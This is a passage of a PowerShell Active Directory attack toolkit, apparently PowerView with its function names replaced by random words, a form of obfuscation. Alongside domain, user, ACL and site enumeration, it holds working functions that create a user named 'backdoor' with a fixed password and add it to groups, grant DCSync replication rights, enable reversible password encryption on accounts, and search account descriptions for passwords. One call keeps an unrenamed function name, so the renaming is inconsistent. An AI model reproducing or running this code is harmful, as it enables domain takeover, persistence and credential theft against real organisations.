            $DistinguishedName = $AdsPath
            $SearchString = ""
        }
        else {
            if($ADSpath -like "LDAP://*") {
                $ADSpath = $ADSpath.Substring(7)
            }
            $DistinguishedName = $ADSpath
        }
    }
    else {
        $DistinguishedName = "DC=$($Domain.Replace('.', ',DC='))"
    }

    $SearchString += $DistinguishedName
    Write-Verbose "Garvey search string: $SearchString"

    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
    $Searcher.PageSize = $PageSize
    $Searcher
}


function Clemens {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain
    )

    process {
        if($Domain) {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Warning "The specified domain $Domain does not exist, could not be contacted, or there isn't an existing trust."
                $Null
            }
        }
        else {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
    }
}


function Acapulco {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest
    )

    process {
        if($Forest) {
            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)
            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                Write-Debug "The specified forest $Forest does not exist, could not be contacted, or there isn't an existing trust."
                $Null
            }
        }
        else {

            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if($ForestObject) {

            $ForestSid = (New-Object System.Security.Principal.NTAccount($ForestObject.RootDomain,"krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
            $Parts = $ForestSid -Split "-"
            $ForestSid = $Parts[0..$($Parts.length-2)] -join "-"
            $ForestObject | Add-Member NoteProperty 'RootDomainSid' $ForestSid
            $ForestObject
        }
    }
}


function hitter {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest,

        [String]
        $Domain
    )

    process {
        if($Domain) {

            if($Domain.Contains('*')) {
                (Acapulco -Forest $Forest).Domains | Where-Object {$_.Name -like $Domain}
            }
            else {

                (Acapulco -Forest $Forest).Domains | Where-Object {$_.Name.ToLower() -eq $Domain.ToLower()}
            }
        }
        else {

            $ForestObject = Acapulco -Forest $Forest
            if($ForestObject) {
                $ForestObject.Domains
            }
        }
    }
}


function carting {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest
    )

    process {
        $ForestObject = Acapulco -Forest $Forest
        if($ForestObject) {
            $ForestObject.FindAllGlobalCatalogs()
        }
    }
}


function terracing {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $LDAP
    )

    process {
        if($LDAP -or $DomainController) {

            summery -Domain $Domain -DomainController $DomainController -FullData -Filter '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
        }
        else {
            $FoundDomain = Clemens -Domain $Domain
            
            if($FoundDomain) {
                $Founddomain.DomainControllers
            }
        }
    }
}








function irregular {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $UserName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $Filter,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Switch]
        $Unconstrained,

        [Switch]
        $AllowDelegation,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {

        $UserSearcher = Garvey -Domain $Domain -ADSpath $ADSpath -DomainController $DomainController -PageSize $PageSize
    }

    process {
        if($UserSearcher) {


            if($Unconstrained) {
                Write-Verbose "Checking for unconstrained delegation"
                $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            }
            if($AllowDelegation) {
                Write-Verbose "Checking for users who can be delegated"

                $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))"
            }
            if($AdminCount) {
                Write-Verbose "Checking for adminCount=1"
                $Filter += "(admincount=1)"
            }


            if($UserName) {

                $UserSearcher.filter="(&(samAccountType=805306368)(samAccountName=$UserName)$Filter)"
            }
            elseif($SPN) {
                $UserSearcher.filter="(&(samAccountType=805306368)(servicePrincipalName=*)$Filter)"
            }
            else {

                $UserSearcher.filter="(&(samAccountType=805306368)$Filter)"
            }

            $UserSearcher.FindAll() | Where-Object {$_} | ForEach-Object {

                Sunkist -Properties $_.Properties
            }
        }
    }
}


function hokier {


    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $UserName = 'backdoor',

        [ValidateNotNullOrEmpty()]
        [String]
        $Password = 'Password123!',

        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName,

        [ValidateNotNullOrEmpty()]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost',

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain
    )

    if ($Domain) {

        $DomainObject = Clemens -Domain $Domain
        if(-not $DomainObject) {
            Write-Warning "Error in grabbing $Domain object"
            return $Null
        }


        Add-Type -AssemblyName System.DirectoryServices.AccountManagement



        $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain), $DomainObject


        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList $Context


        $User.Name = $UserName
        $User.SamAccountName = $UserName
        $User.PasswordNotRequired = $False
        $User.SetPassword($Password)
        $User.Enabled = $True

        Write-Verbose "Creating user $UserName to with password '$Password' in domain $Domain"

        try {

            $User.Save()
            "[*] User $UserName successfully created in domain $Domain"
        }
        catch {
            Write-Warning '[!] User already exists!'
            return
        }
    }
    else {
        
        Write-Verbose "Creating user $UserName to with password '$Password' on $ComputerName"


        $ObjOu = [ADSI]"WinNT://$ComputerName"
        $ObjUser = $ObjOu.Create('User', $UserName)
        $ObjUser.SetPassword($Password)


        try {
            $Null = $ObjUser.SetInfo()
            "[*] User $UserName successfully created on host $ComputerName"
        }
        catch {
            Write-Warning '[!] Account already exists!'
            return
        }
    }


    if ($GroupName) {

        if ($Domain) {
            strands -UserName $UserName -GroupName $GroupName -Domain $Domain
            "[*] User $UserName successfully added to group $GroupName in domain $Domain"
        }

        else {
            strands -UserName $UserName -GroupName $GroupName -ComputerName $ComputerName
            "[*] User $UserName successfully added to group $GroupName on host $ComputerName"
        }
    }
}


function strands {


    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserName,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName,

        [ValidateNotNullOrEmpty()]
        [Alias('HostName')]
        [String]
        $ComputerName,

        [String]
        $Domain
    )


    Add-Type -AssemblyName System.DirectoryServices.AccountManagement


    if($ComputerName -and ($ComputerName -ne "localhost")) {
        try {
            Write-Verbose "Adding user $UserName to $GroupName on host $ComputerName"
            ([ADSI]"WinNT://$ComputerName/$GroupName,group").add("WinNT://$ComputerName/$UserName,user")
            "[*] User $UserName successfully added to group $GroupName on $ComputerName"
        }
        catch {
            Write-Warning "[!] Error adding user $UserName to group $GroupName on $ComputerName"
            return
        }
    }


    else {
        try {
            if ($Domain) {
                Write-Verbose "Adding user $UserName to $GroupName on domain $Domain"
                $CT = [System.DirectoryServices.AccountManagement.ContextType]::Domain
                $DomainObject = Clemens -Domain $Domain
                if(-not $DomainObject) {
                    return $Null
                }

                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $CT, $DomainObject            
            }
            else {

                Write-Verbose "Adding user $UserName to $GroupName on localhost"
                $Context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine, $Env:ComputerName)
            }


            $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($Context,$GroupName)


            $Group.Members.add($Context, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $UserName)


            $Group.Save()
        }
        catch {
            Write-Warning "Error adding $UserName to $GroupName : $_"
        }
    }
}


function despondent {


    [CmdletBinding()]
    param(
        [String[]]
        $Properties,

        [String]
        $Domain,
        
        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    if($Properties) {

        $Properties = ,"name" + $Properties
        irregular -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Select-Object -Property $Properties
    }
    else {

        irregular -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Select-Object -First 1 | Get-Member -MemberType *Property | Select-Object -Property 'Name'
    }
}


function clinging {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $SearchTerm = 'pass',

        [String]
        $SearchField = 'description',

        [String]
        $ADSpath,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    process {
        irregular -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -Filter "($SearchField=*$SearchTerm*)" -PageSize $PageSize | Select-Object samaccountname,$SearchField
    }
}


function perpetuates {


    Param(
        [String]
        $ComputerName = $Env:ComputerName,

        [String]
        [ValidateSet("logon","tgt","all")]
        $EventType = "logon",

        [DateTime]
        $DateStart=[DateTime]::Today.AddDays(-5)
    )

    if($EventType.ToLower() -like "logon") {
        [Int32[]]$ID = @(4624)
    }
    elseif($EventType.ToLower() -like "tgt") {
        [Int32[]]$ID = @(4768)
    }
    else {
        [Int32[]]$ID = @(4624, 4768)
    }


    Get-WinEvent -ComputerName $ComputerName -FilterHashTable @{ LogName = 'Security'; ID=$ID; StartTime=$DateStart} -ErrorAction SilentlyContinue | ForEach-Object {

        if($ID -contains 4624) {    

            if($_.message -match '(?s)(?<=Logon Type:).*?(?=(Impersonation Level:|New Logon:))') {
                if($Matches) {
                    $LogonType = $Matches[0].trim()
                    $Matches = $Null
                }
            }
            else {
                $LogonType = ""
            }


            if (($LogonType -eq 2) -or ($LogonType -eq 3)) {
                try {

                    if($_.message -match '(?s)(?<=New Logon:).*?(?=Process Information:)') {
                        if($Matches) {
                            $UserName = $Matches[0].split("`n")[2].split(":")[1].trim()
                            $Domain = $Matches[0].split("`n")[3].split(":")[1].trim()
                            $Matches = $Null
                        }
                    }
                    if($_.message -match '(?s)(?<=Network Information:).*?(?=Source Port:)') {
                        if($Matches) {
                            $Address = $Matches[0].split("`n")[2].split(":")[1].trim()
                            $Matches = $Null
                        }
                    }


                    if ($UserName -and (-not $UserName.endsWith('$')) -and ($UserName -ne 'ANONYMOUS LOGON')) {
                        $LogonEventProperties = @{
                            'Domain' = $Domain
                            'ComputerName' = $ComputerName
                            'Username' = $UserName
                            'Address' = $Address
                            'ID' = '4624'
                            'LogonType' = $LogonType
                            'Time' = $_.TimeCreated
                        }
                        New-Object -TypeName PSObject -Property $LogonEventProperties
                    }
                }
                catch {
                    Write-Debug "Error parsing event logs: $_"
                }
            }
        }
        if($ID -contains 4768) {

            try {
                if($_.message -match '(?s)(?<=Account Information:).*?(?=Service Information:)') {
                    if($Matches) {
                        $Username = $Matches[0].split("`n")[1].split(":")[1].trim()
                        $Domain = $Matches[0].split("`n")[2].split(":")[1].trim()
                        $Matches = $Null
                    }
                }

                if($_.message -match '(?s)(?<=Network Information:).*?(?=Additional Information:)') {
                    if($Matches) {
                        $Address = $Matches[0].split("`n")[1].split(":")[-1].trim()
                        $Matches = $Null
                    }
                }

                $LogonEventProperties = @{
                    'Domain' = $Domain
                    'ComputerName' = $ComputerName
                    'Username' = $UserName
                    'Address' = $Address
                    'ID' = '4768'
                    'LogonType' = ''
                    'Time' = $_.TimeCreated
                }

                New-Object -TypeName PSObject -Property $LogonEventProperties
            }
            catch {
                Write-Debug "Error parsing event logs: $_"
            }
        }
    }
}


function Sarawak {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SamAccountName,

        [String]
        $Name = "*",

        [Alias('DN')]
        [String]
        $DistinguishedName = "*",

        [Switch]
        $ResolveGUIDs,

        [String]
        $Filter,

        [String]
        $ADSpath,

        [String]
        $ADSprefix,

        [String]
        [ValidateSet("All","ResetPassword","WriteMembers")]
        $RightsFilter,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $Searcher = Garvey -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix $ADSprefix -PageSize $PageSize


        if($ResolveGUIDs) {
            $GUIDs = spare -Domain $Domain -DomainController $DomainController -PageSize $PageSize
        }
    }

    process {

        if ($Searcher) {

            if($SamAccountName) {
                $Searcher.filter="(&(samaccountname=$SamAccountName)(name=$Name)(distinguishedname=$DistinguishedName)$Filter)"  
            }
            else {
                $Searcher.filter="(&(name=$Name)(distinguishedname=$DistinguishedName)$Filter)"  
            }
  
            try {
                $Searcher.FindAll() | Where-Object {$_} | Foreach-Object {
                    $Object = [adsi]($_.path)
                    if($Object.distinguishedname) {
                        $Access = $Object.PsBase.ObjectSecurity.access
                        $Access | ForEach-Object {
                            $_ | Add-Member NoteProperty 'ObjectDN' ($Object.distinguishedname[0])

                            if($Object.objectsid[0]){
                                $S = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                            }
                            else {
                                $S = $Null
                            }
                            
                            $_ | Add-Member NoteProperty 'ObjectSID' $S
                            $_
                        }
                    }
                } | ForEach-Object {
                    if($RightsFilter) {
                        $GuidFilter = Switch ($RightsFilter) {
                            "ResetPassword" { "00299570-246d-11d0-a768-00aa006e0529" }
                            "WriteMembers" { "bf9679c0-0de6-11d0-a285-00aa003049e2" }
                            Default { "00000000-0000-0000-0000-000000000000"}
                        }
                        if($_.ObjectType -eq $GuidFilter) { $_ }
                    }
                    else {
                        $_
                    }
                } | Foreach-Object {
                    if($GUIDs) {

                        $AclProperties = @{}
                        $_.psobject.properties | ForEach-Object {
                            if( ($_.Name -eq 'ObjectType') -or ($_.Name -eq 'InheritedObjectType') ) {
                                try {
                                    $AclProperties[$_.Name] = $GUIDS[$_.Value.toString()]
                                }
                                catch {
                                    $AclProperties[$_.Name] = $_.Value
                                }
                            }
                            else {
                                $AclProperties[$_.Name] = $_.Value
                            }
                        }
                        New-Object -TypeName PSObject -Property $AclProperties
                    }
                    else { $_ }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}


function cheekier {


    [CmdletBinding()]
    Param (
        [String]
        $TargetSamAccountName,

        [String]
        $TargetName = "*",

        [Alias('DN')]
        [String]
        $TargetDistinguishedName = "*",

        [String]
        $TargetFilter,

        [String]
        $TargetADSpath,

        [String]
        $TargetADSprefix,

        [String]
        [ValidatePattern('^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+')]
        $PrincipalSID,

        [String]
        $PrincipalName,

        [String]
        $PrincipalSamAccountName,

        [String]
        [ValidateSet("All","ResetPassword","WriteMembers","DCSync")]
        $Rights = "All",

        [String]
        $RightsGUID,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $Searcher = Garvey -Domain $Domain -DomainController $DomainController -ADSpath $TargetADSpath -ADSprefix $TargetADSprefix -PageSize $PageSize

        if(!$PrincipalSID) {
            $Principal = Wanda -Domain $Domain -DomainController $DomainController -Name $PrincipalName -SamAccountName $PrincipalSamAccountName -PageSize $PageSize
            
            if(!$Principal) {
                throw "Error resolving principal"
            }
            $PrincipalSID = $Principal.objectsid
        }
        if(!$PrincipalSID) {
            throw "Error resolving principal"
        }
    }

    process {

        if ($Searcher) {

            if($TargetSamAccountName) {
                $Searcher.filter="(&(samaccountname=$TargetSamAccountName)(name=$TargetName)(distinguishedname=$TargetDistinguishedName)$TargetFilter)"  
            }
            else {
                $Searcher.filter="(&(name=$TargetName)(distinguishedname=$TargetDistinguishedName)$TargetFilter)"  
            }
  
            try {
                $Searcher.FindAll() | Where-Object {$_} | Foreach-Object {


                    $TargetDN = $_.Properties.distinguishedname

                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalSID)
                    $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
                    $ControlType = [System.Security.AccessControl.AccessControlType] "Allow"
                    $ACEs = @()

                    if($RightsGUID) {
                        $GUIDs = @($RightsGUID)
                    }
                    else {
                        $GUIDs = Switch ($Rights) {

                            "ResetPassword" { "00299570-246d-11d0-a768-00aa006e0529" }

                            "WriteMembers" { "bf9679c0-0de6-11d0-a285-00aa003049e2" }




                            "DCSync" { "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2", "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2", "89e95b76-444d-4c62-991a-0facbeda640c"}
                        }
                    }

                    if($GUIDs) {
                        foreach($GUID in $GUIDs) {
                            $NewGUID = New-Object Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity,$ADRights,$ControlType,$NewGUID,$InheritanceType
                        }
                    }
                    else {

                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] "GenericAll"
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity,$ADRights,$ControlType,$InheritanceType
                    }

                    Write-Verbose "Granting principal $PrincipalSID '$Rights' on $($_.Properties.distinguishedname)"

                    try {

                        ForEach ($ACE in $ACEs) {
                            Write-Verbose "Granting principal $PrincipalSID '$($ACE.ObjectType)' rights on $($_.Properties.distinguishedname)"
                            $Object = [adsi]($_.path)
                            $Object.PsBase.ObjectSecurity.AddAccessRule($ACE)
                            $Object.PsBase.commitchanges()
                        }
                    }
                    catch {
                        Write-Warning "Error granting principal $PrincipalSID '$Rights' on $TargetDN : $_"
                    }
                }
            }
            catch {
                Write-Warning "Error: $_"
            }
        }
    }
}


function resell {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SamAccountName,

        [String]
        $Name = "*",

        [Alias('DN')]
        [String]
        $DistinguishedName = "*",

        [String]
        $Filter,

        [String]
        $ADSpath,

        [String]
        $ADSprefix,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $ResolveGUIDs,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )


    Get-ObjectACL @PSBoundParameters | ForEach-Object {

        $_ | Add-Member Noteproperty 'IdentitySID' ($_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value)
        $_
    } | Where-Object {

        try {
            [int]($_.IdentitySid.split("-")[-1]) -ge 1000
        }
        catch {}
    } | Where-Object {

        ($_.ActiveDirectoryRights -eq "GenericAll") -or ($_.ActiveDirectoryRights -match "Write") -or ($_.ActiveDirectoryRights -match "Create") -or ($_.ActiveDirectoryRights -match "Delete") -or (($_.ActiveDirectoryRights -match "ExtendedRight") -and ($_.AccessControlType -eq "Allow"))
    }
}


function spare {


    [CmdletBinding()]
    Param (
        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}

    $SchemaPath = (Acapulco).schema.name

    $SchemaSearcher = Garvey -ADSpath $SchemaPath -DomainController $DomainController -PageSize $PageSize
    if($SchemaSearcher) {
        $SchemaSearcher.filter = "(schemaIDGUID=*)"
        try {
            $SchemaSearcher.FindAll() | Where-Object {$_} | ForEach-Object {

                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
        }
        catch {
            Write-Debug "Error in building GUID map: $_"
        }      
    }

    $RightsSearcher = Garvey -ADSpath $SchemaPath.replace("Schema","Extended-Rights") -DomainController $DomainController -PageSize $PageSize
    if ($RightsSearcher) {
        $RightsSearcher.filter = "(objectClass=controlAccessRight)"
        try {
            $RightsSearcher.FindAll() | Where-Object {$_} | ForEach-Object {

                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
        }
        catch {
            Write-Debug "Error in building GUID map: $_"
        }
    }

    $GUIDs
}


function summery {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = '*',

        [String]
        $SPN,

        [String]
        $OperatingSystem,

        [String]
        $ServicePack,

        [String]
        $Filter,

        [Switch]
        $Printers,

        [Switch]
        $Ping,

        [Switch]
        $FullData,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $Unconstrained,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {

        $CompSearcher = Garvey -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }

    process {

        if ($CompSearcher) {


            if($Unconstrained) {
                Write-Verbose "Searching for computers with for unconstrained delegation"
                $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            }

            if($Printers) {
                Write-Verbose "Searching for printers"

                $Filter += "(objectCategory=printQueue)"
            }
            if($SPN) {
                Write-Verbose "Searching for computers with SPN: $SPN"
                $Filter += "(servicePrincipalName=$SPN)"
            }
            if($OperatingSystem) {
                $Filter += "(operatingsystem=$OperatingSystem)"
            }
            if($ServicePack) {
                $Filter += "(operatingsystemservicepack=$ServicePack)"
            }

            $CompSearcher.filter = "(&(sAMAccountType=805306369)(dnshostname=$ComputerName)$Filter)"

            try {

                $CompSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    $Up = $True
                    if($Ping) {

                        $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                    }
                    if($Up) {

                        if ($FullData) {

                            Sunkist -Properties $_.Properties
                        }
                        else {

                            $_.properties.dnshostname
                        }
                    }
                }
            }
            catch {
                Write-Warning "Error: $_"
            }
        }
    }
}


function Wanda {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SID,

        [String]
        $Name,

        [String]
        $SamAccountName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $Filter,

        [Switch]
        $ReturnRaw,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    process {
        if($SID) {

            try {
                $Name = baffled $SID
                if($Name) {
                    $Canonical = sires -ObjectName $Name
                    if($Canonical) {
                        $Domain = $Canonical.split("/")[0]
                    }
                    else {
                        Write-Warning "Error resolving SID '$SID'"
                        return $Null
                    }
                }
            }
            catch {
                Write-Warning "Error resolving SID '$SID' : $_"
                return $Null
            }
        }

        $ObjectSearcher = Garvey -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize

        if($ObjectSearcher) {

            if($SID) {
                $ObjectSearcher.filter = "(&(objectsid=$SID)$Filter)"
            }
            elseif($Name) {
                $ObjectSearcher.filter = "(&(name=$Name)$Filter)"
            }
            elseif($SamAccountName) {
                $ObjectSearcher.filter = "(&(samAccountName=$SamAccountName)$Filter)"
            }

            $ObjectSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                if($ReturnRaw) {
                    $_
                }
                else {

                    Sunkist -Properties $_.Properties
                }
            }
        }
    }
}


function moralistic {


    [CmdletBinding()]
    Param (
        [String]
        $SID,

        [String]
        $Name,

        [String]
        $SamAccountName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $Filter,

        [Parameter(Mandatory = $True)]
        [String]
        $PropertyName,

        $PropertyValue,

        [Int]
        $PropertyXorValue,

        [Switch]
        $ClearValue,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    $Arguments = @{
        'SID' = $SID
        'Name' = $Name
        'SamAccountName' = $SamAccountName
        'Domain' = $Domain
        'DomainController' = $DomainController
        'Filter' = $Filter
        'PageSize' = $PageSize
    }

    $RawObject = Wanda -ReturnRaw @Arguments
    
    try {

        $Entry = $RawObject.GetDirectoryEntry()
        
        if($ClearValue) {
            Write-Verbose "Clearing value"
            $Entry.$PropertyName.clear()
            $Entry.commitchanges()
        }

        elseif($PropertyXorValue) {
            $TypeName = $Entry.$PropertyName[0].GetType().name


            $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue 
            $Entry.$PropertyName = $PropertyValue -as $TypeName       
            $Entry.commitchanges()     
        }

        else {
            $Entry.put($PropertyName, $PropertyValue)
            $Entry.setinfo()
        }
    }
    catch {
        Write-Warning "Error setting property $PropertyName to value '$PropertyValue' for object $($RawObject.Properties.samaccountname) : $_"
    }
}


function Blatz {


    [CmdletBinding()]
    Param (
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $SamAccountName,

        [String]
        $Name,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $Filter,

        [Switch]
        $Repair
    )

    process {
        $Arguments = @{
            'SamAccountName' = $SamAccountName
            'Name' = $Name
            'Domain' = $Domain
            'DomainController' = $DomainController
            'Filter' = $Filter
        }


        $UACValues = Wanda @Arguments | select useraccountcontrol | Mohicans

        if($Repair) {

            if($UACValues.Keys -contains "ENCRYPTED_TEXT_PWD_ALLOWED") {

                moralistic @Arguments -PropertyName useraccountcontrol -PropertyXorValue 128
            }


            moralistic @Arguments -PropertyName pwdlastset -PropertyValue -1
        }

        else {

            if($UACValues.Keys -contains "DONT_EXPIRE_PASSWORD") {

                moralistic @Arguments -PropertyName useraccountcontrol -PropertyXorValue 65536
            }

            if($UACValues.Keys -notcontains "ENCRYPTED_TEXT_PWD_ALLOWED") {

                moralistic @Arguments -PropertyName useraccountcontrol -PropertyXorValue 128
            }


            moralistic @Arguments -PropertyName pwdlastset -PropertyValue 0
        }
    }
}


function beheld {


    [CmdletBinding()]
    param(
        [String[]]
        $Properties,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    if($Properties) {

        $Properties = ,"name" + $Properties | Sort-Object -Unique
        summery -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Select-Object -Property $Properties
    }
    else {

        summery -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Select-Object -first 1 | Get-Member -MemberType *Property | Select-Object -Property "Name"
    }
}


function misfortunes {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Term')]
        [String]
        $SearchTerm = 'pass',

        [Alias('Field')]
        [String]
        $SearchField = 'description',

        [String]
        $ADSpath,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    process {
        summery -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -FullData -Filter "($SearchField=*$SearchTerm*)" -PageSize $PageSize | Select-Object samaccountname,$SearchField
    }
}


function elongates {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $OUName = '*',

        [String]
        $GUID,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $FullData,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $OUSearcher = Garvey -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }
    process {
        if ($OUSearcher) {
            if ($GUID) {

                $OUSearcher.filter="(&(objectCategory=organizationalUnit)(name=$OUName)(gplink=*$GUID*))"
            }
            else {
                $OUSearcher.filter="(&(objectCategory=organizationalUnit)(name=$OUName))"
            }

            $OUSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                if ($FullData) {

                    Sunkist -Properties $_.Properties
                }
                else { 

                    $_.properties.adspath
                }
            }
        }
    }
}


function withstands {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SiteName = "*",

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $GUID,

        [Switch]
        $FullData,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $SiteSearcher = Garvey -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -ADSprefix "CN=Sites,CN=Configuration" -PageSize $PageSize
    }
    process {
        if($SiteSearcher) {

            if ($GUID) {

                $SiteSearcher.filter="(&(objectCategory=site)(name=$SiteName)(gplink=*$GUID*))"
            }
            else {
                $SiteSearcher.filter="(&(objectCategory=site)(name=$SiteName))"
            }
            
            try {
                $SiteSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    if ($FullData) {

                        Sunkist -Properties $_.Properties
                    }
                    else {

                        $_.properties.name
                    }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}


function shticks {


    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SiteName = "*",

        [String]
        $Domain,

        [String]
        $ADSpath,

        [String]
        $DomainController,

        [Switch]
        $FullData,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $SubnetSearcher = Garvey -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix "CN=Subnets,CN=Sites,CN=Configuration" -PageSize $PageSize
    }

    process {
        if($SubnetSearcher) {

            $SubnetSearcher.filter="(&(objectCategory=subnet))"

            try {
                $SubnetSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    if ($FullData) {

                        Sunkist -Properties $_.Properties | Where-Object { $_.siteobject -match "CN=$SiteName" }
                    }
                    else {

                        if ( ($SiteName -and ($_.properties.siteobject -match "CN=$SiteName,")) -or ($SiteName -eq '*')) {

                            $SubnetProperties = @{
